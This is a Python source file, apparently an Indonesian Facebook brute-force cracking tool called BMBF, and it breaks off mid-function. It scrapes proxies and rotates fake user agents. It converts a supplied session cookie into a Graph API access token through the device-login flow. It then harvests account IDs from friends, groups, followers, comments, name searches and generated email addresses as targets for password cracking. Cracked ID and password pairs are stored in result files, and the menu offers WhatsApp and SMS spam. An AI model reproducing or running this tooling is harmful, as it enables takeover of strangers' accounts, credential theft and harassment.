#------------------[ IMPORT MODULE ]-------------------#
import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64
from time import sleep
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from rich.console import Group as gp
from bs4 import BeautifulSoup as parser
from rich.columns import Columns as col
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as BrayennnXD 
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
#------------------[  MODULE  ]-------------------#
try:
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests && pip install mechanize ')
#------------------[ GLOBAL NAME ]-------------------#
pretty.install()
CON=sol()
wa = Console()
taplikasi=[]
gabriel=[]
console = Console()
ses=requests.Session()
id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni,method,pwpluss,pwnya= [],[],0,0,0,[],[],[],[],[],[],[],[],[]
ugen2,ugen,dia,cokbrut,dump,memek,ualu,ualuh,lisensikuni,lisensiku,princp=[],[],[],[],[],[],[],[],[],[],[]
sys.stdout.write('\x1b]2; BMBF | BrayennnXD Multi Brute Facebook\x07')
#------------------[ USER-AGENT ]-------------------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print(' [+] Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda Ya Salam Dari BrayennnXD')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android 10;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='K)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)

#------------[ UBAH UA DIH SINI OM ]---------------#
for brayen in range(10000):
    rr = random.randint
    rc = random.choice
    u1 = f"Mozilla/5.0 (Linux; Android 13; 23106RN0DA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
    u2 = f"Mozilla/5.0 (Linux; Android 13; TECNO CK6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
    u3 = f"Mozilla/5.0 (Linux; arm_64; Android 13; CPH2505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 YaSearchBrowser/23.55.1 BroPP/1.0 YaSearchApp/23.55.1 webOmni SA/3 Mobile Safari/537.36"
    u4 = f"Mozilla/5.0 (Linux; Android 10; itel W6502) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36 OPR/62.2.3146.57547"
    u5 = f"Mozilla/5.0 (Linux; U; Android 10; fr-fr; Infinix X657C Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36 PHX/15.3"
    UaMainn = random.choice([u1, u2, u3, u4, u5])
    ugen.append(UaMainn)
 
for x in range(10):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uak=f'Mozilla/5.0 (Linux; Android {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
try:cek_data = requests.get("http://ip-api.com/json/").json()
except:cek_data = {'-'}
try:asal_kota = cek_data["city"]
except:asal_kota = {'-'}
try:asal_reg = cek_data["region"]
except:asal_reg = cek_data['-']
try:times = cek_data["timezone"]
except:times = cek_data['-']
try:city = cek_data["city"]
except:city = cek_data['-']
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	cetak(panel(f"""[bold green]                ___  ____ ____ _   _ ____ _  _ _  _ _  _ 
[bold green]                |__] |__/ |__|  \_/  |___ |\ | |\ | |\ | 
[bold green]                |__] |  \ |  |   |   |___ | \| | \| | \|                                                                                                        
             """,width=90,padding=(0,8),title=f"Banner",style=f"bold white"))
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# Problem Internet Connection, Check And Try Again'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
		
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account',width=90,style=f"bold white"))
		your_cookies = input(' ╰─  Masukan Cookie : ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print(" ╰─  Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"\n ╰─  Token : {access_token}")
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(your_cookies)
							print("\n ╰─  Login Berhasil | python BrayennnFB.py");exit()
			except Exception as e:
				print(" ╰─  Cookies Mokad Kontol")
				os.system('rm -rf .token.txt && rm -rf .cok.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print(' [+] Cookies Kadaluarsa ')
		time.sleep(5)
		login()
	os.system('clear')
	banner()
	negara = requests.get("http://ip-api.com/json/").json()["country"]
	ip = requests.get("http://ip-api.com/json/").json()["query"]
	dia.append(panel(f'[bold white][+[/][bold white]][/] [bold white]Username : [bold green]{my_name}[/]\n[bold white][+[/][bold white]][/] [bold white]User Idz : [bold green]{my_id}[/]\n[bold white][+[/][bold white]][/] [bold white]Tanggal  : [bold green]{waktu}[/][/]\n[bold white][+[/][bold white]][/] [bold white]Status   : [bold green]Premium[/][/]\n[bold white][+[/][bold white]][/] [bold white]Versi Sc : [bold green]Update 3.2[/][/] ',width=43,padding=(0,3),style=f"bold white"))
	dia.append(panel(f'[bold white][+[/][bold white]][/] [bold white]Country  : [bold green]{negara}[/]\n[bold white][+[/][bold white]][/] [bold white]City     : [bold green]{asal_kota}[/]\n[bold white][+[/][bold white]][/] [bold white]Region   : [bold green]{asal_reg}[/][/]\n[bold white][+[/][bold white]][/] [bold white]TimeZone : [bold green]{times}[/][/]\n[bold white][+[/][bold white]][/] [bold white]My Ip    : [bold green]{ip}[/][/] ',width=43,padding=(0,3),style=f"bold white"))
	console.print(Columns(dia))
	cetak(panel(f"[bold white]Alvino_Xy , DerrXr , Asepit-Gans , Rozhak XD , Dapunta , Nazri XD And AOREC XD",width=90,title=f"[bold green]Thanks To",padding=(0,5),style=f"bold white"))
	cetak(panel(f"[bold white][[bold cyan]01[bold white]] Crack From Friends     [bold white][[bold cyan]06[bold white]] Crack From Username[bold white]      [[bold cyan]11[bold white]] Get Headers      \n[bold white][[bold cyan]02[bold white]] Crack From Massal      [bold white][[bold cyan]07[bold white]] Crack From Followers     [[bold cyan]12[bold white]] Spam WhatsApp      \n[bold white][[bold cyan]03[bold white]] Crack From Groups      [[bold cyan]08[bold white]] Crack From Comment       [bold white][[bold cyan]13[bold white]] Spam Sms \n[bold white][[bold cyan]04[bold white]] Crack From Email       [bold white][[bold cyan]09[bold white]] Check Opsi Checkpoint [bold white]   [[bold cyan]14[bold white]] Track Ip \n[bold white][[bold cyan]05[bold white]] Crack From Files       [bold white][[bold cyan]10[bold white]] [bold white]Check Result Crack [bold white]      [[bold cyan]15[bold white]] [bold red]Delete Cookies",width=90,title=f"[bold green]List Menu",style=f"bold white"))
	_____brayennn___xd____ = input(f' [+] Pilih Menu Crack : ')
	if _____brayennn___xd____ in ['1','01']:
		Dump_Publik()
	elif _____brayennn___xd____ in ['2','02']:
		dump_massal()
	elif _____brayennn___xd____ in ['3','03']:
		crack_group()
	elif _____brayennn___xd____ in ['4','04']:
		crack_email()
	elif _____brayennn___xd____ in ['5','05']:
		crack_file()
	elif _____brayennn___xd____ in ['6','06']:
		crack_nama()
	elif _____brayennn___xd____ in ['7','07']:
		pengikut()
	elif _____brayennn___xd____ in ['8','08']:
		komen()
	elif _____brayennn___xd____ in ['9','09']:
		file_cp()
	elif _____brayennn___xd____ in ['10']:
		result()
	elif _____brayennn___xd____ in ['11']:
		siu()
	elif _____brayennn___xd____ in('12'):
		spam_wa()
	elif _____brayennn___xd____ in('13'):
		spam_sms()
	elif _____brayennn___xd____ in('14'):
		lacakip()
	elif _____brayennn___xd____ in ['15']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(f' [+] {m}Sukses Logout+Hapus Cookies{x}')
		time.sleep(5)
		login()
	else:
		print(' [+] Pilih Yang Bener Asu ')
		exit()
def error():
	print(f' [+] Maaf Fitur Ini Masih Di Perbaiki')
	time.sleep(4)
	back() 
def siu():
	start()
	get_data_web()
	akhir()
	
###---------[ CRACK DARI KOMEN ]---------- ###
def komen():
	cetak(panel(f"Pastikan Akun Target Yang Di Pilih Bersifat Publik Jangan Private",width=90,padding=(0,4),style=f"bold white"))
	ide = input(f' [+] Masukan Id Postingan : ')
	url = 'https://mbasic.facebook.com/'+ide
	try:get_komen(url)
	except KeyboardInterrupt:setting()
	if len(dump)==0:
		print(f" [+] Gagal Dump Id, Kemungkinan Akun Private")
		time.sleep(3);exit()
	setting()

def get_komen(url):
	data = parser(ses.get(url).text,"html.parser")
	for isi in data.find_all("h3"):
		for ids in isi.find_all("a",href=True):
			if "profile.php" in ids.get("href"):id = ids.get("href").split('=')[1].replace("&refid","")
			else:id = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","")
			nama = ids.text
			if id+"|"+nama in dump:pass
			else:id.append(id+"|"+nama)
			sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
	for z in data.find_all("a",href=True):
		if "Lihat komentar sebelumnya…" in z.text:
			try:get_komen("https://mbasic.facebook.com"+z["href"])
			except:pass				
#-----------------[ TRACK IP ]-----------------# 
def lacakip():
	link = input(f' [+] Masukan Ip : ')
	url = 'http://ip-api.com/json/' + link
	r = requests.get(url)
	data = json.loads(r.text)
	latitude = data['lat']
	longitude = data['lon']
	google_maps_url = 'https://www.google.com/maps/place/' + str(latitude) + '+' + str(longitude)
	try:
		request = requests.get(url)
		response = request.json()
	except (requests.ConnectionError):
		print(" [+] Koneksi Error")
		exit()
	if response['status'] == 'success':
		print('')
		print(" [+] Alamat IP : " + response['query'])
		print(" [+] Kota : " + response['city'])
		print(" [+] Negara : " + response['country'])
		print(" [+] Kode Negara : " + response['countryCode'])
		print(" [+] Latitude : " + str(response['lat']))
		print(" [+] Longitude : " + str(response['lon']))
		print(" [+] ISP : " + response['isp'])
		print(" [+] Link Google Maps :", google_maps_url)
	else:
		print(" [+] Alamat IP Yang Dimasukkan Salah")
#-----------------[ CRACK GRUP ]-----------------# 
def crack_group():
	cetak(nel(' Masukan Idz Grup Pastikan Grup Bersifat Publik Bukan Private',width=90,padding=(0,8),style=f"bold white"))
	link = input(f' [+] Id Group : ')
	url = 'https://mbasic.facebook.com/'+link
	try:dump_grup(url)
	except KeyboardInterrupt:atur_atur()
	if len(dump)==0:
		exit(f' [+] Gagal Dhump Id Grup, Kemungkinan Grup Private')
	setting()

def dump_grup(url):
	try:
		data = parser(ses.get(url, headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1; A1601 Build LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/E7FBAF"}).text, "html.parser")
		for x in data.find_all("table"):
			par = x.text
			if ">" in par.split(" ") or "mengajukan" in par.split(" "):
				id = re.findall("content_owner_id_new.\w+",str(x))[0].replace("content_owner_id_new.","")
				if " mengajukan pertanyaan ." in par:nama = par.replace(" mengajukan pertanyaan .","")
				else:nama = par.split(" > ")[0]
				if id+"|"+nama in dump:pass
				else:dump.append(id+"|"+nama)
				print(f'\r [+] Mengumpulkan {len(id)} Idz...');sys.stdout.flush()
		for z in data.find_all("a"):
			if "Lihat Postingan Lainnya</span" in str(z).split(">"):
				href = str(z).replace('<a href="','').replace("amp;","").split(" ")[0].replace('"><span>Lihat','')
				dump_grup("https://m.facebook.com"+href)
	except:dump_grup(url)
		
###----------[ DUMP PENGIKUT ]---------- ###
def pengikut():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	ses = requests.Session()
	cetak(panel(f"Ketik 'Me' Jika Ingin Crack Dari Total Followers Anda Sendiri",width=90,padding=(0,7),style=f"bold white"))
	akun = console.input(f' [+] Masukan Id Target : ')
	try:
		koh2 = ses.get(f'https://graph.facebook.com/{akun}?fields=subscribers.limit(5000)&access_token={token}',cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:
			    id.append(pi['id']+'|'+pi['name'])
			    sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
			    time.sleep(0.0002)
			except:continue
		print("\r")
		cetak(panel(f"Berhasil Mengumpulkan {len(id)} Idz",width=90,padding=(0,22),style=f"bold white"))
		setting()
	except requests.exceptions.ConnectionError:
		print(f" [+] Koneksi Internet Anda Bermasalah")
		time.sleep(3);exit()
	except (KeyError,IOError):
		print(f" [+] Gagal Dump Id, Kemungkinan Akun Private")
		time.sleep(3);exit()
#----------------------[ MENU CRACK LAINNYA ]----------------------#
def lainnya():
	cetak(panel(f"[[bold cyan]01[bold white]] Crack Username                   [[bold cyan]03[bold white]] Crack File \n[[bold cyan]02[bold white]] Crack Followers                  [[bold cyan]04[bold white]] Crack Email ",width=90,title=f"[bold green]Menu Crack",padding=(0,8),style=f"bold white"))
	bray = input(f' [+] Pilih Menu Crack : ')
	if bray in(''):
		print(' [+] Pilih Yang Bener Asu ');back()
	if bray in('1','01'):
		crack_nama()
	elif bray in('2','02'):
		pengikut()
	elif bray in('3','03'):
		crack_file()
	elif bray in('4','04'):
		crack_email()
	else:
		print(' [+] Pilih Yang Bener Asu ')
		exit()
#----------------------[ CRACK USERNAME ]----------------------#
def crack_nama():
	nama = []
	custom = [" iqbal"," kami"," siska"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," anisha"," juven"," der"," rika"," udin"," rayan"," tina"," tiara"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
	custom2 = ["galang ","gilang ","gita ","steven ","aulia ","tiyas ","albert ","naura ","anton ","reval ","abi ","yehezkiel ","hafiz ","daniel ","angun "]
	cetak(panel(f"    Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 3.000 Username",width=90,padding=(0,2),style=f"bold white"))
	nam = console.input(f' [+] Masukan Nama : ').split(",")
	for ser in nam:		
		for belakang in custom:
			id = ser+belakang
			nama.append(id)
		for depan in custom2:
			id = depan+ser
			nama.append(id)
	with tred(max_workers=5) as thread:
		for id in nama:
			thread.submit(cari_nama,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")
	setting()
		
def cari_nama(link):
	r = parser(ses.get(str(link)).text,'html.parser')
	for x in r.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for uid,nama in data:
			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in nama:
				nama = re.findall('(.*?)\<',str(nama))[0]
			bo = uid+'|'+nama
			if bo in id:pass
			else:id.append(bo)
	link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
	if(link):
	  sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz ...");sys.stdout.flush()
	  time.sleep(0.0000003)
	  cari_nama(link)
	else:
	     print("\r")
#-----------------[ CRACK EMAIL ]-----------------#
def crack_email():
	rc = random.choice
	rr = random.randint
	xc = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
	global ok , cp
	cetak(nel(f'Masukan Nama Email Yang Ingin Di Crack, Contoh : Andi, Dian, Putri, Aditya',width=90,padding=(0,5),style=f"bold white"))
	nama = console.input(f' [+] Masukan Nama Target : ')
	if ',' in str(nama):
		print(f" [+] Masukan Nama, Jangan Kosong Ngab")
		time.sleep(3);exit()
	cetak(nel(f'Masukan Nama Domain , Contoh : @Gmail.com, @Yahoo.com, Dll',width=90,padding=(0,9),style=f"bold white"))
	doma = console.input(f' [+] Masukan Nama Domain : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		print(f" [+] Masukan Domain Dengan Benar")
		time.sleep(3);exit()
	cetak(nel(f'Max 5000 Idz , Dan Hanya Bisa Menggunakan Metode Reguler Dan Async',width=90,padding=(0,5),style=f"bold white"))
	jumlah = console.input(f' [+] Total Dump : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(xc))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(xc))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(xc))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in id:pass
		else:id.append(D+'|'+nama)
		if len(dump)==999999:setting()
		sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
		time.sleep(0.0000003)
	print("\r")
	setting()	
#-----------------[ CRACK FILE ]-----------------#
def crack_file():
	try:vin = os.listdir('/sdcard/DUMP-FILE/')
	except FileNotFoundError:
		print(' [+] File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print(' [+] Kamu Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/DUMP-FILE/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'\n %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print(' [+] %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
		geeh = input(' [+] Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f' [+] Pilih Yang Bener Kontol {x}')
			time.sleep(3)
			back()
		try:lin = open('/sdcard/DUMP-FILE/'+geh,'r').read().splitlines()
		except:
			print(' [+] File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	cetak(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Hasil OK[/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Hasil CP[/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold red]Kembali[/]',width=90,title=f"[bold white]• [/][bold green]List Menu Cek[/][bold white] •[/]",style=f"bold white"))
	kz = input(f' [+] Pilih : ')
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' [+] File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(' [+] Anda Tidak Memiliki Hasil CP ')
			time.sleep(4)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input(f'\n{P}{x}{H} [+] {x}{P}{x} {P}Select{x} : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' [+] Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(' [+] File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="yellow"))
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['1','01']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(' [+] File Tidak Di Temukan ')
			time.sleep(4)
			back()
		if len(vin)==0:
			print(' [+] Anda Tidak Mempunyai File OK ')
			time.sleep(4)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<80:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n [+] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' [+] Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(' [+] File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'{hh}USER-AGENT : {x}{cpkuni[2]}')
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['3','03']:
		back()
	else:
		print(' [+] Pilih Yang Bener Kontol ')
		exit()
#-------------------[ CRACK-PUBLIK-MASSAL]----------------#
def Dump_Publik():
        with requests.Session() as ses:
                token = open('.token.txt','r').read()
                cok = open('.cok.txt','r').read()
                #print(f'{xxx}─────────────────────────────')
                a = input(f'└── masukan id : ')
                try:
                        params = {
                        "access_token": token,
                        "fields": "name,friends.fields(id,name,birthday)"
                        }
                        b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
                        for c in b["friends"]["data"]:
                                id.append(c["id"]+"|"+c["name"])
                        print(f'└── sukses mgumpulkan {H}{(len(id))}{x} user')
                        setting()
                except Exception as e:
                        print(e)
                        print(f'{P} KONTOLL ASUUU')

#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
